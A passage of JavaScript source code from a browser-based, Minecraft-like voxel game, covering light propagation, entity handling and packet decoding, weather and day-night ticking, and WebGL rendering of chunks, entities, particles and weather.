			let X = (x >> 4) + this.offsetX
			let Z = (z >> 4) + this.offsetZ
			let lwidth = this.lwidth
			let loaded = this.loaded
			if(X >= 0 && X < lwidth && Z >= 0 && Z < lwidth && loaded[X * lwidth + Z]){
				return loaded[X * lwidth + Z].getLight(x & 15, y, z & 15, blockLight)
			}
			return !(blockLight&1) * 15
		}
		setLight(x, y, z, level, block, dimension) {
			let X = (x >> 4) + this.offsetX
			let Z = (z >> 4) + this.offsetZ
			let loaded = this.loaded
			let lwidth = this.lwidth
			if (X >= 0 && X < lwidth && Z >= 0 && Z < lwidth && loaded[X * lwidth + Z]) {
				return loaded[X * lwidth + Z].setLight(x & 15, y, z & 15, level, block)
			}
		}
		updateLight(x, y, z, place, blockLight = 0) {
			let chunk = this.getChunk(x, z)
			let cx = x & 15
			let cz = z & 15
			let center = chunk.getLight(cx, y, cz, 0)
			let centerExposed = chunk.getLight(cx, y, cz, 2)
			let blight = chunk.getLight(cx, y, cz, 1)
			let up = this.getLight(x, y+1, z, 0)
			let upExposed = this.getLight(x, y+1, z, 2)
			let down = this.getLight(x, y-1, z, 0)
			let north = this.getLight(x, y, z+1, 0)
			let south = this.getLight(x, y, z-1, 0)
			let east = this.getLight(x+1, y, z, 0)
			let west = this.getLight(x-1, y, z, 0)
	
			let spread = []
			for (let i = 0; i <= 15; i++) spread[i] = []
			let blspread = [] // block light spread
			if (!place) { // Block was removed; increase light levels
				if (upExposed) { // Exposed to sky light
					let light = upExposed
					for (let i = y; i >= minHeight; i--) {
						let block = blockData[chunk.getBlock(cx, i, cz)]
						if (block.transparent) {
							if(block.decreaseLight){
								light = max(light - block.decreaseLight,0)
							}
							chunk.setLight(cx, i, cz, light, 2)
							if(light > chunk.getLight(cx, i, cz, 0)) chunk.setLight(cx, i, cz, light, 0)
							spread[light].push(x, i, z)
						} else {
							break
						}
					}
					for (let i = 0; i < spread.length; i++){
						if(spread[i].length) chunk.spreadLight(spread[i], i-1, true)
					}
				} else {
					center = max(up, down, north, south, east, west)
					if (center > 0) center -= 1
					this.setLight(x, y, z, center, 0)
					if (center > 1) {
						spread[center].push(x, y, z)
						chunk.spreadLight(spread[center], center - 1, true)
					}
				}
	
				// Block light levels
				if (!blockLight || blockLight < blight) {
					up = this.getLight(x, y+1, z, 1)
					down = this.getLight(x, y-1, z, 1)
					north = this.getLight(x, y, z+1, 1)
					south = this.getLight(x, y, z-1, 1)
					east = this.getLight(x+1, y, z, 1)
					west = this.getLight(x-1, y, z, 1)
					blight = max(up, down, north, south, east, west)
					if (blight > 0) blight -= 1
					this.setLight(x, y, z, blight, 1)
					if (blight > 1) {
						blspread.push(x, y, z)
						chunk.spreadLight(blspread, blight - 1, true, 1)
					}
				}
				if (blockLight) { // Light block was removed
					this.setLight(x, y, z, 0, 1)
					this.setLight(x, y, z, 0, 3)
					blspread.push(x, y, z)
					let respread = []
					for (let i = 0; i <= 15/*blockLight + 1*/; i++) respread[i] = []
					chunk.unSpreadLight(blspread, blockLight - 1, respread, 1)
					chunk.reSpreadLight(respread, 1)
				}
			}
			else if (place && (center !== 0 || blight !== 0)) { // Block was placed; decrease light levels
				let respread = []
				for (let i = 0; i <= 15/*center + 1*/; i++) respread[i] = []
				chunk.setLight(cx, y, cz, 0, 0)
				chunk.setLight(cx, y, cz, 0, 1)
				chunk.setLight(cx, y, cz, 0, 2)
				chunk.setLight(cx, y, cz, 0, 3)
				spread[center].push(x, y, z)
	
				// Sky light
				if(upExposed){
					let light = upExposed
					for (let i = y; i >= minHeight; i--) {
						let block = blockData[chunk.getBlock(cx, i, cz)]
						if (block.transparent) {
							if(block.decreaseLight){
								light = max(light - block.decreaseLight,0)
							}
							chunk.setLight(cx, i, cz, light, 2)
							let prevLight = chunk.getLight(cx, i, cz, 0)
							chunk.setLight(cx, i, cz, light, 0)
							spread[prevLight].push(x, i, z)
						} else if(i === y) {
							light = 0
						} else {
							break
						}
					}
				}
				for (let i = 0; i <= 15; i++){
					if(spread[i].length) chunk.unSpreadLight(spread[i], i - 1, respread)
				}
				//chunk.unSpreadLight(spread[0], 0, respread)
				chunk.reSpreadLight(respread)
	
				// Block light
				if (blight) {
					respread.length = 0
					for (let i = 0; i <= 15/*blight + 1*/; i++) respread[i] = []
					blspread.push(x, y, z)
					chunk.unSpreadLight(blspread, blight - 1, respread, 1)
					chunk.reSpreadLight(respread, 1)
				}
				if (blockLight) { // Light block was placed
					up = this.getLight(x, y+1, z, 1)
					down = this.getLight(x, y-1, z, 1)
					north = this.getLight(x, y, z+1, 1)
					south = this.getLight(x, y, z-1, 1)
					east = this.getLight(x+1, y, z, 1)
					west = this.getLight(x-1, y, z, 1)
					blight = max(max(up, down, north, south, east, west)-1, blockLight)
					this.setLight(x, y, z, blight, 1)
					this.setLight(x, y, z, blockLight, 3)
					blspread.length = 0
					blspread.push(x, y, z)
					chunk.spreadLight(blspread, blight - 1, true, 1)
				}
			}
		}
    getBiome(x,y,z,dimension){
      let chunk = this.getChunk(x,z,dimension)
      if (!chunk) return
      let X = x & 15
      let Z = z & 15
			let caveMinY = chunk.caveY[Z * 16 + X]
			let caveMaxY = chunk.caveY[Z * 16 + X + 256]
			return biomes[y < caveMaxY && y > caveMinY ? (chunk.caveBiomes[Z * 16 + X]) : (chunk.biomes[Z * 16 + X])]
    }
    getEntity(id){
			/*for(let chunk of this.loaded){
				for(let i in chunk.entities){
					if(chunk.entities[i].id === id){
						return chunk.entities[i]
					}
				}
			}*/
			return this.entities.get(id)
    }
		entityPacketType = ServerWorld.entityPacketType
    getEntPos(ent,now){
			ent.spawnRelative = now-ent.spawn
			if(ent.type === "Creeper") ent.timerStartRelative = now-ent.timerStart
			return packetToBitArray(ent,this.entityPacketType,true)
    }
    addEntity(ent, remote, dimension){
      if(!ent.id) ent.id = generateID()
			ent.world = this
      if(dimension || dimension === "") ent.dimension = ent.chunkDimension = dimension
      if(!remote && !ent.remote){
        //host controls entities
        this.sendEntityPos(ent)
      }
			let chunk = this.getChunk(ent.chunkX<<4,ent.chunkZ<<4,ent.dimension)
			if(chunk){
				chunk.entities[ent.id] = ent
			}
			this.entities.set(ent.id,ent)
    }
    deleteEntity(id, remote){
      let ent = this.getEntity(id)
			if(!ent || remote && ent.noRemoteDelete) return
			const {chunkX, chunkZ} = ent
			let chunk = this.getChunk(chunkX<<4,chunkZ<<4,ent.dimension)
			if(!ent) return
			if(chunk) delete chunk.entities[id]
			ent.delete() //better name: ondelete
			id = ent.id
      /*if(!remote){
        send({type:"entityDelete", id})
      }*/
			if(ent.alwaysRender){
				let i = this.alwaysRenderEntities.indexOf(ent)
				this.alwaysRenderEntities.splice(i,1)
			}
			this.entities.delete(id)
    }
    posEntity(p, m, preBetaVersion/*preBetaVersion only used in loadsave*/, objFormat){
			if (typeof p === "string") {
				try {
					p = BitArrayReader(atoarr(p),true)
				}catch(e){
					return
				}
			}else if(!objFormat && !(p instanceof BitArrayReader)) return
			if(!objFormat && p.data[0] !== 0 || preBetaVersion) return this.posEntityOldBab(p, m, preBetaVersion)
			let now = performance.now()
			if(!objFormat) p = bitArrayToPacket(p,this.entityPacketType)
			const entType = entityOrder[p.entId]
			let ent = this.getEntity(p.id)
			if(ent){
				if(entType === "TextDisplay" && ent.text !== p.text) ent.setText(p.text)
				if(entType === "Item" && ent.amount !== p.amount) ent.amount = p.amount, ent.willUpdateShape = true
			}else{
				ent = entities[p.entId]
					if(ent.mob){
					ent = new ent(p.x,p.y,p.z) //todo n: cave spider 'cave', fur
				}
				else switch(entType){
					case "Item":
						ent = new ent(p.x, p.y, p.z, p.velx, p.vely, p.velz, p.block, false, p.amount, p.durability||null, null)
						break
					case "BlockEntity":
						ent = new ent(p.block, p.x,p.y,p.z, p.solidOnGround)
						break
					case "PrimedTNT":
					case "PrimedSuperTNT":
					case "PrimedUltraTNT":
					case "PrimedUnTNT":
						ent = new ent(p.x,p.y,p.z)
						break
					case "MovingBlock":
						ent = new ent(p.block, p.sx,p.sy,p.sz,p.mx,p.my,p.mz,p.despawns,p.solidWhenDone)
						break
					case "BlockDisplay":
						ent = new ent(p.block,p.x,p.y,p.z,0,0,0)
						break
					case "EnderPearl":
					case "Snowball":
					case "SmallFireball":
					case "Egg":
					case "SlingshotShot":
					case "Arrow":
						ent = new ent(p.x,p.y,p.z,0,0,0)
						break
					case "ExperienceOrb":
						ent = new ent(p.x,p.y,p.z,p.amount)
						break
					case "TextDisplay":
						ent = new ent(p.x,p.y,p.z,p.text,p.size,p.color,p.background,p.glow)
						break
					case "Minecart":
						ent = new ent(p.x,p.y,p.z)
						break
					default:
						break
				}
				if(!ent) return
				ent.id = p.id
				this.addEntity(ent, true)
				ent.previousX = p.x
				ent.previousY = p.y
				ent.previousZ = p.z
			}
			if(!ent) return
			ent.setPos(p.x,p.y,p.z,p.velx,p.vely,p.velz)
			ent.dimension = p.dimension
			if(!ent.facesPlayer){
				ent.yaw = p.yaw
				ent.pitch = p.pitch
			}
			ent.spawn = now - p.spawnRelative
			if("from" in ent) ent.from = p.from
			if(p.name) ent.name = p.name
			ent.doingPortal = p.doingPortal
			if(ent.mob){
				ent.harmEffect = p.harmEffect
				ent.health = p.health
				ent.burning = p.burning
				ent.burnTimer = p.burnTimer
				ent.oxygen = p.oxygen
				ent.spinTarget = p.spinTarget
				if(p.path){
					ent.path = p.path
				}else ent.path = null
				if("fur" in ent) ent.fur = p.fur
				if("color" in ent){
					ent.color = p.color
				}
				if("eating" in ent) ent.eating = p.eating
				ent.target = p.target
				if(entType === "Sheep") ent.wool = p.wool
				if("tame" in ent) ent.tame = p.tame
				if("sitting" in ent) ent.sitting = p.sitting
				if("owner" in ent) ent.owner = p.owner
				ent.holding = p.holding
				ent.attractedBy = p.attractedBy
				if(entType === "Creeper"){
					ent.explodeAmount = p.explodeAmount
					ent.timerStart = now - p.timerStartRelative
				}
				ent.attackCooldown = p.attackCooldown
				ent.effects = p.effects
			}else if(ent.type === "BlockDisplay"){
				ent.width = p.width
				ent.height = p.height
				ent.depth = p.depth
			}else if(ent.type === "Minecart"){
				ent.harmEffect = p.harmEffect
				ent.health = p.health
			}
			ent.updateChunk()
			return ent
		}
		sendEntityPos(ent){
			send({type:"entityPos", data:this.getEntPos(ent,performance.now()).array})
		}
		getEntitiesNear(x,y,z,dimension,d, ret = []){
			let minChunkX = x - d >> 4
			let maxChunkX = x + d >> 4
			let minChunkY = y - d >> 4
			let maxChunkY = y + d >> 4
			let minChunkZ = z - d >> 4
			let maxChunkZ = z + d >> 4
			let section = null
			ret.length = 0
			let i = 0
			for (x = minChunkX; x <= maxChunkX; x++) {
				for (z = minChunkZ; z <= maxChunkZ; z++) {
					let chunk = this.getChunk(x*16,z*16,dimension)
					if (chunk) {
						for(let i in chunk.entities){
							ret.push(chunk.entities[i])
						}
					}
				}
			}
			return ret
		}
    addItems(x,y,z,dimension,vx,vy,vz,block,autoSetVel,amount = 1,durability,customName,from){
      if(!block) return
      var data = blockData[block]
			while(amount){
				var a = min(amount,data.stackSize)
				amount -= a
				this.addEntity(new entities[entityIds.Item](x, y, z, vx, vy, vz, block, autoSetVel, a,durability,customName,from),false,dimension)
			}
    }
    
    addParticle(particle,dimension){
			if(p.dimension !== dimension) return
      if(dimension || dimension === "") particle.dimension = dimension
			world.particles.push(particle)
    }
    createParticles(o){
      switch(o.particleType){
        case "blockParticles":
          blockParticles(o.data.block,o.x,o.y,o.z,o.amount, o.data.thisType, this, o.dimension, o.data.dir, true)
          break
        case "SplashParticle":
          if(!performFast) for(var i=0; i<o.amount; i++){
            this.addParticle(new entities[entityIds.SplashParticle](o.x,o.y,o.z),o.dimension)
          }
          break
        case "glint":
          glint(o.x,o.y,o.z,o.dimension,true)
          break
        case "poof":
          poof(o.x,o.y,o.z,o.amount,o.dimension,o.data.w,o.data.h,o.data.d)
          break
        case "NoteParticle":
          this.addParticle(new entities[entityIds.NoteParticle](o.x,o.y,o.z, o.data), o.dimension)
          break
        case "explosion":
          for(let i=0; i<o.data.length; i+=5){
            this.addParticle(new entities[entityIds.ShockwaveParticle](o.data[i], o.data[i+1], o.data[i+2], o.data[i+4]), o.data[i+3],o.dimension)
            this.addParticle(new entities[entityIds.PoofParticle](o.data[i], o.data[i+1], o.data[i+2]), o.data[i+3],o.dimension)
          }
          break
				case "flameCube":
					if(!performFast) for(let i=0; i<o.amount; i++){
						this.addParticle(new entities[entityIds.FlameParticle](o.x+rand(-0.6,0.6),o.y+rand(-0.6,0.6),o.z+rand(-0.6,0.6)),o.dimension)
					}
					break
				case "fireworkExplode":
					fireworkExplode(o.x,o.y,o.z,o.dimension,o.data.type,o.data.color,true)
          break
				case "hearts":
					for(let i=0; i<o.amount; i++){
						this.addParticle(new entities[entityIds.HeartParticle](o.x+rand()-0.5,o.y+rand()-0.5,o.z+rand()-0.5),o.dimension)
					}
					break
				case "smokeCube":
					if(!performFast) for(let i=0; i<o.amount; i++){
						this.addParticle(new entities[entityIds.SmokeParticle](o.x+rand()-0.5,o.y+rand()-0.5,o.z+rand()-0.5),o.dimension)
					}
					break
      }
    }
    generateTextForEntity(text,user,size,color,background){
      var e = new entities[entityIds.TextDisplay](user.x,user.y,user.z,text,size,color,background)
      e.dimension = user.dimension || ""
      return e
    }
    
		async tick() {
			let tickStart = performance.now()
			let maxChunkX = (p.x >> 4) + settings.renderDistance
			let maxChunkZ = (p.z >> 4) + settings.renderDistance
			let chunk = maxChunkX + "," + maxChunkZ
			if ((chunk !== this.lastChunk || p.dimension !== this.lastDimension) && multiplayer.hasStartedLoad) {
				if(p.dimension !== this.lastDimension) world.loaded.length = 0 //Reload all chunks
				this.lastChunk = chunk
				this.lastDimension = p.dimension
				this.loadChunks()
				this.chunkGenQueue.sort(sortChunks)
			}
      
			sleepCount = 0, sleepTotal = 0
			if(!p.spectator && !p.die && p.dimension === ""){
				if(p.sleeping) sleepCount++
				sleepTotal++
			}
			for(let e in players){
				if(players[e].hidden || players[e].dimension !== "") continue
				if(players[e].sleeping) sleepCount++
				sleepTotal++
			}
			allSleeping = this.isMK && sleepCount === sleepTotal

      if(worldSettings.dayNightCycle){
        if(screen === "sleep" && allSleeping){
          worldTime += 6.25
        }else worldTime += 0.125
      }
      if(rand() > 0.2) flicker = rand() > 0.9
			if(worldSettings.weatherCycle && this.isMK){
				nextWeather -= (screen === "sleep" && allSleeping) ? 6.25 : 0.125
				if(nextWeather <= 0) {
					nextWeather = 0
					weather = weather ? "" : "rain"
					nextWeather = weather ? rand(0.5,1)*1000 : rand(0.5,7.5)*1000
				}
			}
			if(prevWeather !== weather){
				prevWeather = weather
				if(weather) prevActualWeather = weather
			}
			prevWeatherAmount = weatherAmount
			if(weather === "rain" || weather === "snow"){
				if(slowWeatherAmount >= 0.5){
					weatherAmount += 0.02
					if(weatherAmount > 1) weatherAmount = 1
				}
				slowWeatherAmount += 0.01
				if(slowWeatherAmount > 1) slowWeatherAmount = 1
			}else{
				weatherAmount -= 0.02
				if(weatherAmount < 0) weatherAmount = 0
				slowWeatherAmount -= 0.01
				if(slowWeatherAmount < 0) slowWeatherAmount = 0
			}

      if(screen !== "loading" && screen !== "netherLoading" && screen !== "endLoading"){
				for (let i = 0; i < this.sortedChunks.length; i++) {
					this.sortedChunks[i].tick()
				}
        if(multiplayer){
          for(let i in players){
            players[i].update()
          }
        }
      }
			for (let i=0; i<this.particles.length; i++) {
				const particle = this.particles[i]
				particle.update()
				if (particle.canDespawn || (particle.y <= minEntityY)) {
					particle.delete()//ondelete
					this.particles.splice(i,1)
				}
			}
			this.lastUpdate = now

			if(this.ticking) return
			this.ticking = true
			let doneWork = true
			while(doneWork && inWorld) {
				doneWork = false
				debug.start = performance.now()
				if (this.meshQueue.length) {
					// Update all chunk meshes.
					do {
						await this.meshQueue.pop().genMesh()
					} while(this.meshQueue.length)
					doneWork = true
					debug("Meshes")
				}
				if (this.weatherMeshQueue.length) {
					this.weatherMeshQueue.pop().genWeather()
					doneWork = true
					debug("Weather Meshes")
				}
				/*if (!doneWork && this.unlightingQueue.length) {
					let chunk = this.unlightingQueue[this.unlightingQueue.length-1]
					chunk.unfillLight()
					if(!chunk.lit){
						this.unlightingQueue.pop()
						doneWork = true
					}
				}*/
				// Spread light
				if (!doneWork && this.lightingQueue.length) {
					for(let i=0; i<this.lightingQueue.length && !doneWork; i++){
						let chunk = this.lightingQueue[i]
						chunk.fillLight()
						if(chunk.lit){
							this.lightingQueue.splice(i,1)
							i--
							doneWork = true
						}
					}
				}

				if (this.chunkGenQueue.length && !doneWork) {
					for(let i=0; i<this.chunkGenQueue.length && !doneWork; i++){
						let chunk = this.chunkGenQueue[i]
						if (!fillReqs(chunk.x >> 4, chunk.z >> 4, chunk.type)) {
				 		} else if (!chunk.optimized) {
							await chunk.optimize()
							debug("Optimize")
							doneWork = true
						} else if (!chunk.buffer) {
							chunk.genMesh()
							debug("Initial mesh")
							doneWork = true
						} else {
							this.chunkGenQueue.splice(i,1)
							i--
							doneWork = true
						}
					}
				}
				if (doneWork) await window.yieldThread()
			}
			this.ticking = false
		}
		render() {
      gl.useProgram(program3D)
			initModelView(p.camera)
      let diff = (now - this.lastUpdate) / tickTime
			if (diff > 1) diff = 1
      let time = worldTime % 1000
      if(p.dimension === "nether" || p.dimension === "end"){
        skyLight = 0.5
      }else{ //if you change this, change server
        if(time > 725 && time < 800) skyLight = mapFrom(time, 800,725) //get darker
        else if(time > 200 && time < 275) skyLight = mapFrom(time, 200,275) //get brighter
        else if(time >= 800 || time <= 200) skyLight = 0
        else skyLight = 1
      }
			let skylightAmount = min(abs(250-time)/50, abs(750-time)/50, 1)//1 at most times, 0 at sunrise and sunset
			let orange = 0
      if(inLiquid === 1){
        skyBottom[0] = sky[0] = waterFogColor[0]
        skyBottom[1] = sky[1] = waterFogColor[1]
        skyBottom[2] = sky[2] = waterFogColor[2]
      }else if(inLiquid === 2){
        skyBottom[0] = sky[0] = 0.8
        skyBottom[1] = sky[1] = 0
        skyBottom[2] = sky[2] = 0
			}else if(inLiquid === 3){
        skyBottom[0] = sky[0] = 0.5
        skyBottom[1] = sky[1] = 0.25
        skyBottom[2] = sky[2] = 0
      }else if(p.dimension === "nether" || p.dimension === "end"){
        skyBottom[0] = sky[0] = defaultSky[0]
        skyBottom[1] = sky[1] = defaultSky[1]
        skyBottom[2] = sky[2] = defaultSky[2]
			}else{
        sky[0] = defaultSky[0]
        sky[1] = defaultSky[1]
        sky[2] = defaultSky[2]
        orange = min(max(
					time>250 ? 1-(time-250)/125 : 1-(250-time)/50,
					time>750 ? 1-(time-750)/50 : 1-(750-time)/125,
					0), 1)
				let bottomColor = customResources.settings.skyBottom || defaultSkyBottom
				let orangeColor = customResources.settings.skyOrange || skyOrange
        skyBottom[0] = lerp(orange, bottomColor[0], orangeColor[0])
        skyBottom[1] = lerp(orange, bottomColor[1], orangeColor[1])
        skyBottom[2] = lerp(orange, bottomColor[2], orangeColor[2])
				if(slowWeatherAmount){
					let w = (1-slowWeatherAmount)*0.5+0.5
					skyBottom[0] *= w
					skyBottom[1] *= w
					skyBottom[2] *= w
				}
				if(weatherAmount){
					sky[0] = lerp(weatherAmount, sky[0], 0.5)
					sky[1] = lerp(weatherAmount, sky[1], 0.5)
					sky[2] = lerp(weatherAmount, sky[2], 0.5)
				}
      }
			
			if(p.dimension !== "nether" && p.dimension !== "end"){
				let rotation = ((worldTime%1000)*Math.PI/500)+Math.PI
				let s = sin(rotation)
				this.sunDir.set(s,cos(rotation),s*0.5)
				this.sunDir.normalize()
				this.skylightDir.set(this.sunDir)
				if(this.skylightDir.y>0){
					this.skylightDir.x = -this.skylightDir.x
					this.skylightDir.y = -this.skylightDir.y
					this.skylightDir.z = -this.skylightDir.z
				}
				if(settings.graphics === "morereal") p.shadowMapper.render(this.skylightDir,this)
			}else{
				p.shadowMapper.clear()
			}
			
      if(inLiquid) gl.clearColor(sky[0]*brightness, sky[1]*brightness, sky[2]*brightness, 1)
      else gl.clearColor(sky[0] * skyLight*brightness, sky[1] * skyLight*brightness, sky[2] * skyLight*brightness, 1)
      gl.clear(gl.DEPTH_BUFFER_BIT | gl.COLOR_BUFFER_BIT)
      
			fogBrightness = skyLight
      if(p.dimension !== "nether" && p.dimension !== "end"){
        //skybox render
        if(inLiquid === 0 && !performFast){
          skybox.render()
        }
				if(weatherAmount){
					let w = weather || prevActualWeather
					if(w === "snow" || w === "rain") skyLight *= 0.8 + (1-weatherAmount)*0.2
				}
				skyLight = max(skyLight, skybox.moonLight[skybox.getMoonPhase()]/15)
      }
			let lightMethod = disableLighting ? -1 :  (p.dimension === "nether" ? 1 : (p.dimension === "end" ? 2 : 0))//if you change this, change render or tick
      p.renderX = lerp(diff,p.previousX,p.x)
      p.renderY = lerp(diff,p.previousY,p.y)
      p.renderZ = lerp(diff,p.previousZ,p.z)
      this.textEntities.length = 0
      gl.useProgram(program3D);
			renderedChunks = renderedEntities = totalEntites = 0
			fogDist = lerp(weatherAmount, settings.renderDistance * 16, weatherDist)
			/*if (this.chunkGenQueue.length) {
				for(let chunk of this.chunkGenQueue){
					if(chunk.type === p.dimension) dist = min(dist, chunkDist(chunk))
				}
			}
			if (dist !== fogDist) {
				if (fogDist < dist - 0.1) fogDist += (dist - fogDist) / 120 * dt
				else if (fogDist > dist + 0.1) fogDist += (dist - fogDist) / 30 * dt
				else fogDist = dist
			}*/

      gl.uniform1i(glCache.isInWorld, 1)
			gl.uniform3f(glCache.uPos, p.renderX, p.renderY, p.renderZ)
			gl.uniform1f(glCache.uDist, fogDist)
			// this is interesting because uTime is not actually based on time
			// if you are going to change this to use actual time change line 4487 as well
			// since it depends on it
			gl.uniform1f(glCache.uTime, skyLight)
      gl.uniform1f(glCache.uGameTime, now / 1000)
      gl.uniform3f(glCache.skyColor, skyBottom[0], skyBottom[1], skyBottom[2])
      gl.uniform1i(glCache.inLiquid, inLiquid)
      gl.uniform1f(glCache.brightness, brightness)
      gl.uniform1i(glCache.flicker, flicker)
			gl.uniform1f(glCache.fogTime, fogBrightness)
			gl.uniform1i(glCache.lightMethod, lightMethod)
			if(settings.graphics === "morereal"){
				gl.uniformMatrix4fv(glCache.skylightView0, false, p.shadowMapper.matrices[0].elements)
				gl.uniformMatrix4fv(glCache.skylightView1, false, p.shadowMapper.matrices[1].elements)
				gl.uniformMatrix4fv(glCache.skylightView2, false, p.shadowMapper.matrices[2].elements)
				gl.uniform3f(glCache.skylightDir, this.skylightDir.x,this.skylightDir.y,this.skylightDir.z)
				gl.uniform1f(glCache.skylightAmount, skylightAmount)
				gl.uniform1f(glCache.skyOrange, orange)
			}

			let c = this.sortedChunks
			for (let chunk of c) {
				chunk.render()
			}

			gl.useProgram(programEntity)
      gl.uniform1i(glCache.flickerEntity, flicker)
      gl.uniform1f(glCache.uTimeEntity, skyLight)
      gl.uniform3f(glCache.skyColorEntity, skyBottom[0], skyBottom[1], skyBottom[2])
      gl.uniform1f(glCache.brightnessEntity, brightness)
    	gl.uniform1i(glCache.useNormalsEntity, 1)
			gl.uniform1f(glCache.uGameTimeEntity, now/1000)
			gl.uniform1f(glCache.fogTimeEntity, fogBrightness)
			gl.uniform1f(glCache.uDistEntity, fogDist)
      gl.uniform1i(glCache.inLiquidEntity, inLiquid)
			gl.uniform1f(glCache.uLanternEntity, lantern)
			gl.uniform1i(glCache.lightMethodEntity, lightMethod)
			if(settings.graphics === "morereal"){
				gl.uniformMatrix4fv(glCache.skylightView0Entity, false, p.shadowMapper.matrices[0].elements)
				gl.uniformMatrix4fv(glCache.skylightView1Entity, false, p.shadowMapper.matrices[1].elements)
				gl.uniformMatrix4fv(glCache.skylightView2Entity, false, p.shadowMapper.matrices[2].elements)
				gl.uniform3f(glCache.skylightDirEntity, this.skylightDir.x,this.skylightDir.y,this.skylightDir.z)
				gl.uniform1f(glCache.skylightAmountEntity, skylightAmount)
				gl.uniform1f(glCache.skyOrangeEntity, orange)
			}

      gl.disable(gl.CULL_FACE);
			let cull = false
			for(let chunk of c){
				for (let i in chunk.entities) {
					const entity = chunk.entities[i]
					//if(entity.alwaysRender) continue
					if(dist3(entity.x,entity.y,entity.z,p.camera.renderX,p.camera.renderY,p.camera.renderZ) > settings.renderDistance*16+max(entity.width,entity.height,entity.depth)) continue//out of render distance
					if(cull !== entity.cullFace){
						cull = entity.cullFace
						cull ? gl.enable(gl.CULL_FACE) : gl.disable(gl.CULL_FACE)
					}
					entity.render()
				}
			}
			/*for (let i in this.alwaysRenderEntities) {
				const entity = this.alwaysRenderEntities[i]
				if(entity.dimension !== p.dimension) continue
				if(cull !== entity.cullFace){
					cull = entity.cullFace
					cull ? gl.enable(gl.CULL_FACE) : gl.disable(gl.CULL_FACE)
				}
				entity.render()
			}*/
      gl.disable(gl.CULL_FACE)
			for(let i in players){
				let player = players[i]
				if(player.dimension === p.dimension){
					if(player === p.spectating) gl.enable(gl.CULL_FACE)
					player.render()
					if(player === p.spectating) gl.disable(gl.CULL_FACE)
				}
			}
      gl.enable(gl.CULL_FACE);
			p.render()

			gl.cullFace(gl.FRONT)
			for(let e of blockHereEntity){
				if(e.show){
					e.world = this
					e.render()
				}
			}
			gl.cullFace(gl.BACK)
    	gl.uniform1i(glCache.useNormalsEntity, 0)
      
      gl.useProgram(programParticle)
      gl.uniform1i(glCache.flickerParticle, flicker)
      gl.uniform1f(glCache.uTimeParticle, skyLight)
      gl.uniform3f(glCache.skyColorParticle, skyBottom[0], skyBottom[1], skyBottom[2])
      gl.uniform1f(glCache.brightnessParticle, brightness)
			gl.uniform1f(glCache.fogTimeParticle, fogBrightness)
			gl.uniform1f(glCache.uDistParticle, fogDist)
      gl.uniform1i(glCache.inLiquidParticle, inLiquid)
			gl.uniform1f(glCache.uLanternParticle, lantern)
			gl.uniform1i(glCache.lightMethodParticle, lightMethod)
			if(settings.graphics === "morereal"){
				gl.uniformMatrix4fv(glCache.skylightView0Particle, false, p.shadowMapper.matrices[0].elements)
				gl.uniformMatrix4fv(glCache.skylightView1Particle, false, p.shadowMapper.matrices[1].elements)
				gl.uniformMatrix4fv(glCache.skylightView2Particle, false, p.shadowMapper.matrices[2].elements)
				gl.uniform3f(glCache.skylightDirParticle, this.skylightDir.x,this.skylightDir.y,this.skylightDir.z)
				gl.uniform1f(glCache.skylightAmountParticle, skylightAmount)
				gl.uniform1f(glCache.skyOrangeParticle, orange)
			}
			for (let i=0; i<this.particles.length; i++) {
				const particle = this.particles[i]
				particle.render()
			}
      
      gl.disable(gl.CULL_FACE)
      gl.useProgram(programText)
      for (let i = this.textEntities.length - 1; i >= 0; i--) {
				const entity = this.textEntities[i]
				if(entity.dimension === p.dimension) entity.renderText()
			}

			if(weatherAmount && p.dimension !== "nether" && p.dimension !== "end"){
				gl.useProgram(programWeather)
				gl.uniform1i(glCache.uSamplerWeather, 3)
				gl.uniform1f(glCache.uLightLevelWeather, skyLight)
				gl.uniform1f(glCache.uGameTimeWeather, now/1000)
				gl.uniform1f(glCache.uAmountWeather, lerp((now-lastTick)/tickTime,prevWeatherAmount,weatherAmount))
      	gl.uniform1f(glCache.brightnessWeather, brightness)
				gl.uniform3f(glCache.uPosWeather, p.camera.renderX, p.camera.renderY, p.camera.renderZ)
				gl.uniformMatrix4fv(glCache.uViewWeather, false, p.camera.getMatrix())
				for (let chunk of this.loaded) {
					chunk.renderWeather()
				}
			}
			gl.useProgram(programEntity)
			for(let i in players){
				let player = players[i]
				if(player.dimension === p.dimension){
					if(player.crack > -1 && player.survival){
						let pos = player.crackPos
						crack.entity.x = pos[0]
						crack.entity.y = pos[1]
						crack.entity.z = pos[2]
						crack.entity.changeTexture(crack[player.crack])
						crack.entity.render()
					}
				}
			}
      if(crack.idx > -1 && p.survival && hitBox.pos){
        crack.entity.x = hitBox.pos[0]
        crack.entity.y = hitBox.pos[1]
        crack.entity.z = hitBox.pos[2]
        crack.entity.changeTexture(crack.tex)
        crack.entity.render()
      }
      gl.enable(gl.CULL_FACE)

      gl.useProgram(program3D)
			gl.uniform1i(glCache.uSampler, 0)
      if (this.doubleRenderChunks.length) {
				gl.depthMask(false)
				gl.uniform1i(glCache.uTrans, 1)
				for (let chunk of this.doubleRenderChunks) {
					if(chunk.type === p.dimension) chunk.render()
				}
				gl.uniform1i(glCache.uTrans, 0)
				gl.depthMask(true)
			}
			gl.uniform3f(glCache.uPos, 0, 0, 0)
      gl.uniform1i(glCache.inLiquid, 0)
			if(hitBox.pos) {
				blockOutlines = true
				blockFill = false
				matrix.set(p.camera.transformation.elements)
				block2(hitBox.pos[0], hitBox.pos[1], hitBox.pos[2], 0, p.camera)
				p.camera.transformation.elements.set(matrix)
				blockOutlines = false
				blockFill = true
			}
			if(p.selectStart){
				let w = round(p.x)-p.selectStart[0], h = ceil(p.y-p.height*0.5)-p.selectStart[1], d = round(p.z)-p.selectStart[2]
				let ws = Math.sign(w)||1, hs = Math.sign(h)||1, ds = Math.sign(d)||1
				w += ws, h += hs, d += ds
				matrix.set(p.camera.transformation.elements)
				p.camera.transformation.scale(w, h, d)
				gl.uniform1i(glCache.uTrans, 1)
				gl.disable(gl.CULL_FACE)
				block2((p.selectStart[0]+(w-ws)*0.5)/w, (p.selectStart[1]+(h-hs)*0.5)/h, (p.selectStart[2]+(d-ds)*0.5)/d, "selectBlocks", p.camera)
				p.camera.transformation.elements.set(matrix)
				gl.uniform1i(glCache.uTrans, 0)
				gl.enable(gl.CULL_FACE)
			}
			if(p.copySelect){
				let w = p.copySelect[0]*0.5+0.5, h = p.copySelect[1]*0.5+0.5, d = p.copySelect[2]*0.5+0.5
				gl.uniform1i(glCache.uTrans, 1)
				gl.disable(gl.CULL_FACE)
				matrix.set(p.camera.transformation.elements)
				p.camera.transformation.scale(w, h, d)
